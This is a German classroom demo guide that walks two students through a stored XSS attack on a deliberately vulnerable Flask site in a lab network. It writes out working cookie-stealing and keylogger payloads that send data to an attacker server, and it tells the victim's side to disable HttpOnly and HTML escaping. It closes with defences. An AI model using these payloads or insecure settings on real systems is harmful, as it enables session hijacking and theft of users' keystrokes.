# 🎯 Demo-Anleitung: XSS Attack mit 2 Computern

## ⚠️ NUR FÜR BILDUNGSZWECKE - Kontrollierte Laborumgebung

---

## 📋 Übersicht

### Die Rollen:
- **Computer 1 (Kumpel)** = Betreibt die verwundbare Website (Opfer)
- **Computer 2 (Du)** = Betreibt den Attacker-Server (Hacker)

### Was demonstriert wird:
Du klaust den **Session-Cookie deines Kumpels** von **seiner eigenen Website**, um seine Session zu übernehmen.

---

## 🔧 Vorbereitung (VOR der Präsentation)

### Computer 1 (Kumpel) - Verwundbare Website

**1. Repository klonen/kopieren:**
```bash
# Falls noch nicht vorhanden
cd ~/Documents
git clone [REPOSITORY_URL] hackingWithPython2
cd hackingWithPython2
```

**2. Dependencies installieren:**
```bash
pip3 install -r requirements.txt
```

**3. MySQL vorbereiten:**
```bash
# MySQL starten
mysql -u root -p

# Datenbank erstellen
CREATE DATABASE IF NOT EXISTS hackingdb;
USE hackingdb;

# Schema importieren
SOURCE schema.sql;

# Exit
exit;
```

**4. Testuser anlegen (optional):**
- Starte App kurz: `python3 app.py`
- Registriere User "admin" mit Passwort "admin123"
- Stoppe App wieder (Ctrl+C)

**5. IP-Adresse notieren:**
```bash
# macOS
ipconfig getifaddr en0

# Linux
hostname -I | awk '{print $1}'

# Beispiel Output: 192.168.1.50
```
**→ Diese IP aufschreiben!** (z.B. `192.168.1.50`)

---

### Computer 2 (Du) - Attacker Server

**1. Nur attacker_server.py brauchen:**
Du brauchst nur diese eine Datei auf deinem Laptop!

**2. Dependencies installieren:**
```bash
pip3 install flask flask-cors
```

**3. IP-Adresse notieren:**
```bash
# macOS
ipconfig getifaddr en0

# Linux
hostname -I | awk '{print $1}'

# Beispiel Output: 192.168.1.10
```
**→ Diese IP aufschreiben!** (z.B. `192.168.1.10`)

**4. Payload vorbereiten:**
Erstelle eine Textdatei `payloads.txt` mit:

```html
COOKIE STEALER:
<script>fetch('http://192.168.1.10:8888/steal_cookie?c='+document.cookie)</script>

KEYLOGGER:
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://192.168.1.10:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

**⚠️ WICHTIG:** Ersetze `192.168.1.10` mit **DEINER echten IP** von Schritt 3!

---

### Netzwerk-Check (WICHTIG!)

**Beide Computer müssen im gleichen Netzwerk sein!**

**Test von Computer 2 (Du):**
```bash
# Ping zu Kumpels Computer
ping 192.168.1.50

# Sollte antworten mit:
# 64 bytes from 192.168.1.50: icmp_seq=0 ttl=64 time=2.3 ms
```

**Test von Computer 1 (Kumpel):**
```bash
# Ping zu deinem Computer
ping 192.168.1.10

# Sollte auch antworten
```

Falls Ping **nicht** funktioniert:
- Beide im gleichen WLAN?
- Firewall deaktiviert? (nur für Demo!)
- Router erlaubt Peer-to-Peer?

---

## 🎬 DEMO-ABLAUF (Vor dem Prof)

### Phase 1: Server starten

#### Computer 1 (Kumpel):
```bash
cd hackingWithPython2
python3 app.py
```

**Ausgabe sollte sein:**
```
 * Running on http://0.0.0.0:5001
 * Running on http://192.168.1.50:5001
```

**→ Dieses Terminal offen lassen!**

#### Computer 2 (Du):
```bash
python3 attacker_server.py
```

**Ausgabe sollte sein:**
```
╔══════════════════════════════════════════════════════════╗
║           🎯 ATTACKER SERVER GESTARTET 🎯               ║
║  Port: 8888                                              ║
╚══════════════════════════════════════════════════════════╝

📝 Logdateien:
   • Cookies:   /path/to/stolen_cookies.txt
   • Keylogs:   /path/to/keylog.txt

🚀 Server startet...
```

**→ Dieses Terminal offen lassen und SICHTBAR für Prof!**

---

### Phase 2: Verbindung testen (Optional, aber empfohlen)

#### Computer 2 (Du) - Test ob Kumpels Website erreichbar ist:
```bash
# Im Browser öffnen:
http://192.168.1.50:5001
```

Du solltest die Login-Seite sehen.

#### Computer 1 (Kumpel) - Test ob dein Attacker-Server erreichbar ist:
```bash
# Im Browser öffnen:
http://192.168.1.10:8888
```

Er sollte die Statusseite sehen:
```
🎯 Attacker Server
Status: ONLINE
```

**Wenn beide Tests funktionieren → Weiter!**
**Wenn nicht → Firewall/Netzwerk-Problem beheben!**

---

### Phase 3: Der Angriff (ZEIGEN DEM PROF)

#### 👤 Computer 2 (DU) - Angreifer Perspektive

**Schritt 1: Auf fremde Website gehen**

Browser öffnen: `http://192.168.1.50:5001`

**Schritt 2: Als Angreifer registrieren**
- Klicke "Register"
- Username: `hacker`
- Password: `password123`
- Bio: (leer lassen)
- Registrieren

**Schritt 3: Einloggen**
- Login mit `hacker` / `password123`

**Schritt 4: Malicious Payload posten**

**Option A - Via Posts (empfohlen):**
- Gehe zu: `http://192.168.1.50:5001/posts`
- Im Textfeld den **COOKIE STEALER** einfügen:
  ```html
  <script>fetch('http://192.168.1.10:8888/steal_cookie?c='+document.cookie)</script>
  ```
- Button "Post" klicken

**Option B - Via Bio:**
- Gehe zu: `http://192.168.1.50:5001/users`
- Klicke "Edit Bio" bei deinem User
- Füge Payload in Bio-Feld ein
- Speichern

**Schritt 5: Warten**
Sage dem Prof:
> "Der Schadcode ist jetzt in der Datenbank gespeichert. Sobald der Admin die Seite besucht, wird sein Cookie gestohlen."

**→ Zeige dein Terminal mit attacker_server.py - noch keine Ausgabe**

---

#### 👨‍💼 Computer 1 (KUMPEL) - Opfer Perspektive

**Der Kumpel übernimmt jetzt und zeigt:**

**Schritt 1: Als Admin einloggen**

Browser öffnen: `http://localhost:5001` ODER `http://192.168.1.50:5001`

- Login als: `admin` / `admin123`

**Schritt 2: Die verwundbare Seite besuchen**

Gehe zu: `http://192.168.1.50:5001/posts`

**→ Seite lädt normal, NICHTS sieht verdächtig aus!**

Sage dem Prof:
> "Ich sehe nur normale Posts, aber im Hintergrund wurde gerade JavaScript ausgeführt."

---

#### 🎯 Computer 2 (DU) - Zeige den Erfolg!

**SOFORT in deinem Terminal sollte erscheinen:**

```
====================================================================
🍪 COOKIE GESTOHLEN!
--------------------------------------------------------------------
Zeitpunkt:   2025-12-02 16:45:30
Opfer IP:    192.168.1.50
User-Agent:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...
Cookie:      session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0...
====================================================================
```

**→ ZEIGE DAS DEM PROF!**

Sage dem Prof:
> "Der Session-Cookie des Admins wurde gestohlen! Mit diesem Cookie könnte ich mich jetzt als Admin auf seiner Website ausgeben - Session Hijacking."

---

### Phase 4: Keylogger Demo (Optional - falls Zeit)

#### Computer 2 (Du):
Poste einen zweiten Post mit dem **KEYLOGGER**:
```html
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://192.168.1.10:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

#### Computer 1 (Kumpel):
- Besuche die Posts-Seite erneut
- Tippe irgendetwas (z.B. in die Suchleiste auf der Seite)
- Warte 3 Sekunden

#### Computer 2 (Du) - Terminal zeigt:
```
⌨️  KEYLOG [16:47:10] [192.168.1.50]: test password
⌨️  KEYLOG [16:47:13] [192.168.1.50]: secret message
```

Sage dem Prof:
> "Jetzt werden auch alle Tastatureingaben mitgeloggt!"

---

## 📊 Screen-Setup für Präsentation

### Empfohlenes Layout:

```
┌─────────────────────────────────────────────────────────┐
│ BEAMER / GROSSER BILDSCHIRM                             │
│                                                          │
│  Computer 2 (Dein Laptop):                              │
│  ┌────────────────────────────────────────────────────┐ │
│  │ Terminal: attacker_server.py                       │ │
│  │                                                     │ │
│  │ 🍪 COOKIE GESTOHLEN!                               │ │
│  │ Opfer IP: 192.168.1.50                             │ │
│  │ Cookie: session=eyJ1c2VyIjp7ImlkIjoxLCJ1...        │ │
│  │                                                     │ │
│  │ ⌨️ KEYLOG: password123                             │ │
│  └────────────────────────────────────────────────────┘ │
│                                                          │
└─────────────────────────────────────────────────────────┘

┌──────────────────────┐  ┌──────────────────────┐
│ Computer 1 (Kumpel)  │  │ Computer 2 (Du)      │
│ Browser:             │  │ Browser:             │
│ Posts als Admin      │  │ Posts Payload posten │
└──────────────────────┘  └──────────────────────┘
```

**Wichtig:** Das **Terminal von Computer 2** auf den Beamer, damit Prof die gestohlenen Daten sieht!

---

## 🔍 Troubleshooting während der Demo

### Problem: "Connection refused" / Keine Daten kommen an

**Quick-Fix:**

**Computer 2 (Du) - Firewall check:**
```bash
# macOS - Firewall AUS für Demo
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off

# Nach Demo wieder AN:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
```

**Computer 1 (Kumpel) - Test Request:**
```bash
# Teste ob dein Server erreichbar ist
curl http://192.168.1.10:8888

# Sollte HTML zurückgeben
```

---

### Problem: Payload wird als Text angezeigt

**Ursache:** Templates escapen HTML

**Quick-Fix auf Computer 1:**

Prüfe `templates/posts.html` - muss `|safe` enthalten:
```html
{{ post.content|safe }}
```

Falls nicht vorhanden, schnell hinzufügen!

---

### Problem: Cookie ist leer

**Ursache:** HttpOnly ist aktiviert

**Quick-Fix auf Computer 1:**

In `app.py` Zeile 12 prüfen:
```python
app.config['SESSION_COOKIE_HTTPONLY'] = False  # MUSS False sein!
```

Falls True → auf False ändern → App neu starten

---

## ✅ Checkliste VOR der Präsentation

### Computer 1 (Kumpel):
- [ ] MySQL läuft
- [ ] Datenbank `hackingdb` existiert
- [ ] User "admin" / "admin123" existiert
- [ ] `app.py` läuft auf Port 5001
- [ ] IP-Adresse bekannt (z.B. 192.168.1.50)
- [ ] Von Computer 2 erreichbar (Ping-Test)

### Computer 2 (Du):
- [ ] `attacker_server.py` läuft auf Port 8888
- [ ] IP-Adresse bekannt (z.B. 192.168.1.10)
- [ ] Payloads vorbereitet mit RICHTIGER IP
- [ ] Von Computer 1 erreichbar (Ping-Test)
- [ ] Terminal gut lesbar für Beamer

### Netzwerk:
- [ ] Beide im gleichen WLAN
- [ ] Ping funktioniert in beide Richtungen
- [ ] Browser-Test: Computer 2 → `http://192.168.1.50:5001` funktioniert
- [ ] Browser-Test: Computer 1 → `http://192.168.1.10:8888` funktioniert

### Dateien:
- [ ] `stolen_cookies.txt` leer/gelöscht (für frische Demo)
- [ ] `keylog.txt` leer/gelöscht (für frische Demo)

---

## 🎓 Erklärung für den Prof

### Was demonstriert wird:

**1. Stored XSS (Cross-Site Scripting):**
- Schadcode wird in der Datenbank persistent gespeichert
- Jeder Besucher der Seite führt den Code aus

**2. Cookie-Diebstahl / Session Hijacking:**
- Session-Cookie wird an Attacker-Server gesendet
- Ermöglicht Übernahme der User-Session
- Admin-Zugriff könnte kompromittiert werden

**3. Keylogger:**
- Tastatureingaben werden abgefangen
- Passwörter, persönliche Nachrichten werden gestohlen

### Warum ist das gefährlich?

- ✅ **Persistent:** Angriff bleibt in DB, betrifft alle zukünftigen Besucher
- ✅ **Unsichtbar:** Opfer merkt nichts
- ✅ **Privilege Escalation:** Admin-Cookie → voller Zugriff
- ✅ **Data Exfiltration:** Daten verlassen die Website unbemerkt

### Schutzmaßnahmen:

**1. Input Sanitization:**
```python
import html
content = html.escape(user_input)
```

**2. Output Encoding:**
```html
{{ content }}  <!-- NICHT: {{ content|safe }} -->
```

**3. Content Security Policy (CSP):**
```python
response.headers['Content-Security-Policy'] = "default-src 'self'"
```

**4. HttpOnly Cookies:**
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
```

---

## 📸 Screenshot/Video Backup

**Falls Demo scheitert, Screenshots vorbereiten:**

1. Terminal mit "🍪 COOKIE GESTOHLEN!" Nachricht
2. Browser mit dem geposteten Payload
3. `stolen_cookies.txt` Datei mit Beispiel-Daten

**Video als Backup:**
- Bitte jemanden, die ganze Demo vorher zu filmen
- Falls Live-Demo Probleme hat → Video zeigen

---

## 🎯 Zeitplan für die Demo

```
00:00 - 00:30  Einleitung + Server starten
00:30 - 01:00  Payload posten (Computer 2)
01:00 - 01:30  Admin besucht Seite (Computer 1)
01:30 - 02:00  Cookie-Diebstahl zeigen (Computer 2 Terminal)
02:00 - 03:00  Keylogger Demo (optional)
03:00 - 05:00  Erklärung Schutzmaßnahmen
```

**Gesamt: ~5 Minuten**

---

## 🚀 Los geht's!

**Viel Erfolg bei der Präsentation!**

Bei Fragen während der Demo:
- Ruhig bleiben
- Logs checken (Terminal-Ausgaben)
- Ping-Test wiederholen
- Notfalls: Screenshot/Video-Backup

**Du schaffst das! 🎓**
